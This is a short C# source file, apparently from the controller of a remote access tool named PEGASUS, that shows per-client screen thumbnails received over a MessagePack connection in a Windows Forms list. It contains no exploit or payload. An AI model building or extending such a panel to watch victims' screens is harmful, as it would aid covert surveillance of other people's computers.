using System.Drawing;
using System.IO;
using System.Windows.Forms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;

namespace PEGASUS.Handle_Packet
	{
public class HandleThumbnails
{
	public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
	{
		try
		{
			if (client.LV2 == null)
			{
				client.LV2 = new ListViewItem();
				client.LV2.Text = $"{client.Ip}:{client.TcpClient.LocalEndPoint.ToString().Split(':')[1]}";
				client.LV2.ToolTipText = client.ID;
				client.LV2.Tag = client;
				using MemoryStream stream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes());
				Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(stream));
				client.LV2.ImageKey = client.ID;
				lock (Settings.LockListviewThumb)
				{
					Program.form1.listView3.Items.Add(client.LV2);
					return;
				}
			}
			using MemoryStream stream2 = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes());
			lock (Settings.LockListviewThumb)
			{
				Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
				Program.form1.ThumbnailImageList.Images.Add(client.ID, Image.FromStream(stream2));
			}
		}
		catch
		{
		}
	}
}
}